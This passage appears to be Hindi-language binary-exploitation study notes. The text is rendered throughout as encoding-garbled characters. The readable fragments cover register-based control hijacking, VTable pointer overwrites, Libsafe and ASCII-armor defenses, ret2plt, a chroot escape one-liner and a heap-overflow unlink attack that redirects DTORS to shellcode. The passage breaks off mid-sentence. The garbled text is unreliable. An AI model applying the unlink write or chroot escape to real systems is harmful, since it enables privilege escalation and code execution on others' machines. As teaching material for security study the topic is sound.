‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Æ‡•à‡§Ç‡§®‡•á ‡§ú‡•ã ‡§™‡§¢‡§º‡§æ ‡§π‡•à, ‡§â‡§∏‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, ‡§Ö‡§®‡•ç‡§Ø ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç, **‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§Æ‡•á‡§Ç `call ebx`, `call esi` ‡§Ø‡§æ `call edi`** ‡§π‡•à, ‡§§‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§≤‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§æ ‡§Ü‡§™ EBP ‡§ï‡•ã ‡§≠‡•Ä ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ESP ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

**C++ ‡§Æ‡•á‡§Ç VTable ‡§î‡§∞ VPTR**

‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§ï‡§ï‡•ç‡§∑‡§æ ‡§ï‡§æ ‡§è‡§ï **Vtable** ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã **‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏** ‡§ï‡§æ ‡§è‡§ï ‡§ê‡§∞‡•á ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï **‡§ï‡§ï‡•ç‡§∑‡§æ** ‡§ï‡•Ä ‡§è‡§ï **VPtr** ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§ú‡•ã ‡§â‡§∏‡§ï‡•Ä ‡§ï‡§ï‡•ç‡§∑‡§æ ‡§ï‡•á ‡§ê‡§∞‡•á ‡§ï‡§æ **‡§™‡•â‡§á‡§Ç‡§ü‡§∞** ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ VPtr ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§µ‡§∏‡•ç‡§§‡•Å ‡§ï‡•á ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§π‡§ø‡§∏‡•ç‡§∏‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø **VPtr** ‡§ï‡§æ **‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§è‡§ï ‡§°‡§Æ‡•Ä ‡§µ‡§ø‡§ß‡§ø ‡§ï‡•Ä ‡§ì‡§∞ **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§™‡§∞ ‡§ú‡§æ‡§è‡•§

## **‡§®‡§ø‡§µ‡§æ‡§∞‡§ï ‡§â‡§™‡§æ‡§Ø ‡§î‡§∞ ‡§¨‡§ö‡§æ‡§µ**

**Libsafe ‡§ï‡§æ ‡§™‡•ç‡§∞‡§§‡§ø‡§∏‡•ç‡§•‡§æ‡§™‡§®**

‡§á‡§∏‡•á ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à: LD\_PRELOAD=/lib/libsafe.so.2\
‡§Ø‡§æ\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

‡§Ø‡§π ‡§ï‡•Å‡§õ ‡§Ö‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡•á ‡§ï‡•â‡§≤ ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§á‡§Ç‡§ü‡§∞‡§∏‡•á‡§™‡•ç‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§Æ‡§æ‡§®‡§ï‡•Ä‡§ï‡•É‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ (‡§ï‡•á‡§µ‡§≤ x86 ‡§ï‡•á ‡§≤‡§ø‡§è, -fomit-frame-pointer ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§ï‡§≤‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§π‡•Ä‡§Ç, ‡§∏‡•ç‡§•‡•à‡§§‡§ø‡§ï ‡§∏‡§Ç‡§ï‡§≤‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§π‡•Ä‡§Ç, ‡§∏‡§≠‡•Ä ‡§Ö‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§¨‡§®‡§§‡•á ‡§î‡§∞ LD\_PRELOAD suid ‡§µ‡§æ‡§≤‡•á ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ)‡•§

**ASCII ‡§Ü‡§∞‡•ç‡§Æ‡§∞‡•ç‡§° ‡§è‡§°‡•ç‡§∞‡•á‡§∏ ‡§∏‡•ç‡§™‡•á‡§∏**

‡§Ø‡§π 0x00000000 ‡§∏‡•á 0x00ffffff ‡§§‡§ï ‡§∏‡§æ‡§ù‡§æ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§π‡§Æ‡•á‡§∂‡§æ ‡§è‡§ï ‡§¨‡§æ‡§á‡§ü 0x00 ‡§π‡•ã‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§Ø‡§π ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§≤‡§ó‡§≠‡§ó ‡§ï‡•ã‡§à ‡§π‡§Æ‡§≤‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§∞‡•ã‡§ï‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§≤‡§ø‡§ü‡§ø‡§≤ ‡§è‡§Ç‡§°‡§ø‡§Ø‡§® ‡§Æ‡•á‡§Ç‡•§

**ret2plt**

‡§Ø‡§π ‡§è‡§ï ROP ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø strcpy@plt (plt ‡§∏‡•á) ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§î‡§∞ GOT ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§è‡§Ç‡§ü‡•ç‡§∞‡•Ä ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§â‡§∏ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§™‡§π‡§≤‡•á ‡§¨‡§æ‡§á‡§ü ‡§ï‡•ã ‡§ï‡•â‡§™‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§ú‡§ø‡§∏‡•á ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡§æ ‡§π‡•à (system())‡•§ ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶, GOT+1 ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§µ‡§π‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ system() ‡§ï‡§æ 2¬∫ ‡§¨‡§æ‡§á‡§ü ‡§ï‡•â‡§™‡•Ä ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à... ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, GOT ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§™‡§§‡•á ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã system() ‡§π‡•ã‡§ó‡§æ‡•§

**chroot() ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§ø‡§Ç‡§ú‡§∞‡•á**

debootstrap -arch=i386 hardy /home/user ‚Äî> ‡§è‡§ï ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§â‡§™‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§ï‡•á ‡§§‡§π‡§§ ‡§è‡§ï ‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§™‡•ç‡§∞‡§£‡§æ‡§≤‡•Ä ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

‡§è‡§ï ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§á‡§®‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§è‡§ï ‡§™‡§ø‡§Ç‡§ú‡§∞‡•á ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à: mkdir foo; chroot foo; cd ..

**‡§ï‡•ã‡§° ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡•Å‡§Æ‡•á‡§Ç‡§ü‡•á‡§∂‡§®**

Valgrind ‚Äî> ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§ñ‡•ã‡§ú\
Memcheck\
RAD (‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§è‡§°‡•ç‡§∞‡•á‡§∏ ‡§°‡§ø‡§´‡•á‡§Ç‡§°‡§∞)\
Insure++

## **8 ‡§π‡•Ä‡§™ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã: ‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü**

**‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ**

prev\_size |\
size | ‚Äî‡§π‡•á‡§°‡§∞\
\*mem | ‡§°‡•á‡§ü‡§æ

**‡§´‡•ç‡§∞‡•Ä ‡§ü‡•Å‡§ï‡§°‡§º‡§æ**

prev\_size |\
size |\
\*fd | ‡§Ö‡§ó‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞\
\*bk | ‡§™‡§ø‡§õ‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‚Äî‡§π‡•á‡§°‡§∞\
\*mem | ‡§°‡•á‡§ü‡§æ

‡§´‡•ç‡§∞‡•Ä ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§è‡§ï ‡§°‡§¨‡§≤ ‡§≤‡§ø‡§Ç‡§ï‡•ç‡§° ‡§≤‡§ø‡§∏‡•ç‡§ü (‡§¨‡§ø‡§®) ‡§Æ‡•á‡§Ç ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§ï‡§≠‡•Ä ‡§≠‡•Ä ‡§¶‡•ã ‡§´‡•ç‡§∞‡•Ä ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§è‡§ï ‡§∏‡§æ‡§• ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã ‡§∏‡§ï‡§§‡•á (‡§µ‡•á ‡§Æ‡§ø‡§≤ ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç)‡•§

‚Äúsize‚Äù ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§ø‡§ü ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç: ‡§Ø‡§¶‡§ø ‡§™‡§ø‡§õ‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§ü‡•Å‡§ï‡§°‡§º‡§æ mmap() ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§¶‡§ø ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï ‡§è‡§∞‡•á‡§®‡§æ ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§Ü‡§∏‡§®‡•ç‡§® ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§á‡§®‡§ï‡§æ ‡§µ‡§ø‡§≤‡§Ø unlink() ‡§Æ‡•à‡§ï‡•ç‡§∞‡•ã ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§®‡§è ‡§¨‡§°‡§º‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã frontlink() ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§á‡§∏‡•á ‡§â‡§ö‡§ø‡§§ ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

unlink(){\
BK = P->bk; ‚Äî> ‡§®‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ BK ‡§µ‡§π‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§´‡•ç‡§∞‡•Ä ‡§•‡§æ\
FD = P->fd; ‚Äî> ‡§®‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ FD ‡§µ‡§π‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§´‡•ç‡§∞‡•Ä ‡§•‡§æ\
FD->bk = BK; ‚Äî> ‡§Ö‡§ó‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ BK ‡§®‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à\
BK->fd = FD; ‚Äî> ‡§™‡§ø‡§õ‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ FD ‡§®‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à\
}

‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§π‡§Æ P->bk ‡§ï‡•ã ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§™‡§§‡•á ‡§∏‡•á ‡§î‡§∞ P->fd ‡§ï‡•ã GOT ‡§Ø‡§æ DTORS ‡§Æ‡•á‡§Ç 12 ‡§ï‡§Æ ‡§ï‡•á ‡§™‡§§‡•á ‡§∏‡•á ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§π‡§Æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

‡§î‡§∞ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§§‡•á ‡§∏‡§Æ‡§Ø ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, unlink() ‡§ï‡§æ 4‡§µ‡§æ‡§Ç ‡§ï‡§•‡§® ‡§ï‡•Å‡§õ ‡§≤‡§ø‡§ñ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•ã ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§∞‡§Æ‡•ç‡§Æ‡§§ ‡§ï‡•Ä ‡§ú‡§æ‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> ‡§Ø‡§π ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á 8‡§µ‡•á‡§Ç ‡§¨‡§æ‡§á‡§ü ‡§∏‡•á 4 ‡§¨‡§æ‡§á‡§ü ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡§æ ‡§ï‡§æ‡§∞‡§£ ‡§¨‡§®‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡§æ ‡§™‡§π‡§≤‡§æ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§è‡§ï jmp ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§§‡§æ‡§ï‡§ø ‡§á‡§∏‡•á ‡§õ‡•ã‡§°‡§º ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§¨‡§æ‡§ï‡•Ä ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§≤‡•á ‡§ú‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§¨‡§®‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:

buffer1 ‡§Æ‡•á‡§Ç ‡§π‡§Æ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•ã ‡§è‡§ï jmp ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π nops ‡§Ø‡§æ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§¨‡§æ‡§ï‡•Ä ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§Æ‡•á‡§Ç ‡§ó‡§ø‡§∞ ‡§ú‡§æ‡§è‡•§

‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§π‡§Æ ‡§Ö‡§ó‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á prev\_size ‡§î‡§∞ size ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡§∞‡§æ‡§à ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§® ‡§∏‡•ç‡§•‡§æ‡§®‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§π‡§Æ 0xfffffff0 ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç (‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ prev\_size ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§á‡§∏‡§ï‡§æ ‡§¨‡§ø‡§ü ‡§Ø‡§π ‡§ï‡§π‡•á ‡§ï‡§ø ‡§Ø‡§π ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à) ‡§î‡§∞ ‚Äú-4‚Äú(0xfffffffc) size ‡§Æ‡•á‡§Ç (‡§§‡§æ‡§ï‡§ø ‡§ú‡§¨ ‡§§‡•Ä‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•Ä ‡§ú‡§æ‡§è ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§´‡•ç‡§∞‡•Ä ‡§•‡§æ, ‡§§‡•ã ‡§Ø‡§π ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ prev\_size ‡§™‡§∞ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã ‡§â‡§∏‡•á ‡§¨‡§§‡§æ‡§è‡§ó‡§æ ‡§ï‡§ø ‡§Ø‡§π ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à) -> ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ú‡§¨ free() ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§§‡•ã ‡§Ø‡§π ‡§§‡•Ä‡§∏‡§∞‡•á ‡§ï‡•á size ‡§™‡§∞ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§≤‡•á‡§ï‡§ø‡§® ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§™‡§∞ -4 ‡§™‡§∞ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§∏‡•ã‡§ö‡•á‡§ó‡§æ ‡§ï‡§ø ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à‡•§ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§Ø‡§π **unlink()** ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

unlink() ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø, P->fd ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§™‡§π‡§≤‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è ‡§µ‡§π‡§æ‡§Ç ‡§µ‡§π ‡§™‡§§‡§æ ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç -12 (‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø FD->bk ‡§Æ‡•á‡§Ç ‡§µ‡§π FD ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§™‡§§‡•á ‡§Æ‡•á‡§Ç 12 ‡§ú‡•ã‡§°‡§º‡•á‡§ó‡§æ)‡•§ ‡§î‡§∞ ‡§â‡§∏ ‡§™‡§§‡•á ‡§™‡§∞ ‡§µ‡§π ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§™‡§§‡§æ ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§™‡§§‡•á (P->bk ‡§ù‡•Ç‡§†‡§æ) ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™‡•Ä 